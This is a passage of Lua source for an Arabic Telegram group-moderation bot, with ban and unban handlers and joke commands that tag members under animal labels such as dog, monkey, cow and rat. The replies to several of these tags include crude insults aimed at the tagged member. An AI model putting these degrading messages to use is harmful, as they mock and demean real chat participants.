if text == ("رفع جلب") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم رفع جلب في الكروب\n✯︙تعال حبي اطيك عضمه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل جلب")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل جلب في الكروب\n✯︙حبي رجع عضمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل القروده' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Motee:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم تنزيل جميع القروده بالكروب')
end
if text == ("تاك للقروده") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n✯︙قائمة القروده الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» القرد [@"..username.."]\n"
else
t = t..""..k.."» القرد `"..v.."`\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد قرد"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع قرد") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم رفع قرد في الكروب\n✯︙تعال حبي استلم موزه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل قرد")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل قرد من الكروب\n✯︙رجع موزه حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل الضلوع' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Bro:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم تنزيل جميع الضلوع بالكروب')
end
if text == ("تاك للضلوع") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
t = "\n✯︙قائمة الضلوع الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الضلع [@"..username.."]\n"
else
t = t..""..k.."» الضلع `"..v.."`\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد ضلع"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع ضلع") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bro:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم رفع ضلع في الكروب\n✯︙تعال حبيبي انت صرت من الضلوع حظر روحك منا ورايح نطلع سفرات للجزيره والزوراء ونشرب عرك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل ضلع")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Bro:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل ضلع من الكروب\n✯︙بعد لتراويني وجهك ياحقير وجيب فلوس الشرب'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل الضلعات' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم تنزيل جميع الضلعات بالكروب')
end
if text == ("تاك للضلعات") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n✯︙قائمة الضلعات الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الضلعه [@"..username.."]\n"
else
t = t..""..k.."» الضلعه `"..v.."`\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد ضلعه"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع ضلعه") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم رفع ضلعه في الكروب\n✯︙تعاي صرتي من ضلعاتي تمكيجي وخل نروح للمول نرقم صاكين'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل ضلعه")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل ضلعه من الكروب\n✯︙دمشي ولي ملطخه وجهه تلطخ وتريد ترقم صاكين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل البقرات' and Mod(msg) then
database:del(bot_id..'Bakra:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم تنزيل جميع البقرات بالكروب')
end
if text == ("تاك للبقرات") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
t = "\n✯︙قائمة البقرات الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» البقره [@"..username.."]\n"
else
t = t..""..k.."» البقره "..v.."\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد البقره"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع بقره") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم رفع بقره في الكروب\n✯︙ها يالهايشه تع احلبك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل بقره")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل بقره من الكروب\n✯︙تعال هاك حليب مالتك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل الطليان' and Mod(msg) then
database:del(bot_id..'Tele:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم تنزيل جميع طليان بالكروب')
end
if text == ("تاك للطليان") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
t = "\n✯︙قائمة الطليان الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الطلي[@"..username.."]\n"
else
t = t..""..k.."» الطلي "..v.."\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد طلي"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع طلي") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم رفع الطلي في الكروب\n✯︙طلع برا ابو البعرور الوصخ'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل طلي")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل الطلي من الكروب\n✯︙هاك اخذ بعرور'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل الزواحف' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم تنزيل جميع زواحف')
end
if text == ("تاك للزواحف") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n✯︙قائمة الزواحف الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الزاحف [@"..username.."]\n"
else
t = t..""..k.."» الزاحف "..v.."\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد زاحف"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع زاحف") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم رفع زاحف في الكروب\n✯︙كمشتك حبي جيب رقم'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل زاحف")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل زاحف من الكروب\n✯︙هاك حبي هذا رقم مالك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تنزيل جريذيه' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Jred:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم تنزيل جميع جريزي')
end
if text == ("تاك للجريذيه") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n✯︙قائمة الجريذيه الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الجريذي [@"..username.."]\n"
else
t = t..""..k.."» الجريذي "..v.."\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد جريذي"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("رفع جريذي") and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
local  statuss  = '\n✯︙تم رفع جريذي في الكروب\n✯︙خايس ريحتك موتتنه روح سبح يع'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل جريذي")) and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيل جريذي من الكروب\n✯︙هاك ليفه اسبح'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'مسح المحظورين' and ChanSub(msg) and Mod(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
send(msg.chat_id_, msg.id_, '✯︙*لا يوجد محظورين*')
database:del(bot_id..'Ban:User'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatus" .. 'Left' }, }, dl_cb, nil)
database:del(bot_id..'Ban:User'..msg.chat_id_)
x = x + 1
end
send(msg.chat_id_, msg.id_, '✯︙تم مسح المحظورين')
end
end
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
if text == ("المحظورين") and ChanSub(msg) then
local list = database:smembers(bot_id..'Ban:User'..msg.chat_id_)
t = "\n✯︙قائمة محظورين الكروب \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد محظورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("حظر") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع حظر البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'✯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text and text:match("^حظر @(.*)$") and ChanSub(msg) and Mod(msg) then
local username = text:match("^حظر @(.*)$")
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع حظر ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'✯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.id_)
usertext = '\n✯︙المستخدم » ['..result.title_..'](t.me/'..(username or 'GLOBLA')..')'
status  = '\n✯︙تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, '✯︙لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^حظر (%d+)$") and ChanSub(msg) and Mod(msg) then
local userid = text:match("^حظر (%d+)$") 
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الحظر') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع حظر البوت")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع حظر ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'✯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, userid)
chat_kick(msg.chat_id_, userid)  
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end,nil)   
end
return false
end
if text == ("الغاء حظر") and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '✯︙انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
 
if text and text:match("^الغاء حظر @(.*)$") and ChanSub(msg) and Mod(msg) then
local username = text:match("^الغاء حظر @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '✯︙انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء حظره'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء حظر (%d+)$") and ChanSub(msg) and Mod(msg) then
local userid = text:match("^الغاء حظر (%d+)$") 
if tonumber(userid) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '✯︙انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
